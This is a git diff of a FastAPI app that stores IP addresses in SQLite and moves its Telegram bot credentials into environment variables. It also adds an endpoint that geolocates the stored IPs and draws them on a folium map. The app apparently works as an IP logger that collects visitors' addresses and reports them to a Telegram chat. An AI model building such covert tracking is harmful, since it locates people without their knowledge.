@@ -1,13 +1,16 @@
-from fastapi import FastAPI, Form
+from fastapi import FastAPI, Form, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse
 from fastapi.middleware.cors import CORSMiddleware
 import requests
 import sqlite3 as sql
-import asyncio
+import folium
+import os
+from dotenv import load_dotenv
+load_dotenv()
 
-TOKEN = "token del bot aqui"
-CHAT_ID = "tu id de telegram"
+TOKEN = os.getenv('TELEGRAM_TOKEN')
+CHAT_ID = os.getenv('TELEGRAM_USER_ID')
 
 app = FastAPI()
 
@@ -43,7 +46,7 @@ def writeTxt():
 
 @app.get("/")
 def root():
-    return FileResponse("index.html")
+    return FileResponse("frontend/index.html")
 
 @app.post("/getIp")
 async def getIp(
@@ -68,3 +71,61 @@ WHERE rowid NOT IN (
     conn.commit()
     conn.close()
     return {"status": "ok"}
+
+@app.get("/map")
+async def map(
+    request: Request
+):
+    conn = sql.connect("IPsDatabase.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT ip FROM IPs")
+    data = cursor.fetchall()
+    conn.commit()
+    conn.close()
+
+    ips_coords = []
+
+    def ipInfo(ip):
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        data = response.json()
+        return data
+
+    for i in data:
+        rData = ipInfo(i[0])
+        ips_coords.append((rData["lat"], rData["lon"]))
+
+    response = requests.get(f"https://api.ipify.org?format=json")
+    serverIp = response.json()["ip"]
+    serverData = ipInfo(serverIp)
+    server_coord = (serverData["lat"], serverData["lon"])
+
+    m = folium.Map(location=[20,0], zoom_start=2, tiles="CartoDB dark_matter")
+
+    for lat, lon in ips_coords:
+        folium.CircleMarker(
+            location=(lat, lon),
+            radius=5,
+            color="cyan",
+            fill=True,
+            fill_color="cyan",
+            fill_opacity=0.8,
+            popup=f"IP: {lat}, {lon}"
+        ).add_to(m)
+
+    folium.CircleMarker(
+        location=server_coord,
+        radius=7,
+        color="red",
+        fill=True,
+        fill_color="red",
+        fill_opacity=1,
+        popup="Servidor"
+    ).add_to(m)
+
+    m.save("mapa_ips.html")
+    return {"message" : f"Mapa generado porfavor visite {request.base_url}/seeMap o vea el html desde la carpeta en la que esta este main.py"}
+
+@app.get("/seeMap")
+def seeMap():
+    return FileResponse("mapa_ips.html")
+
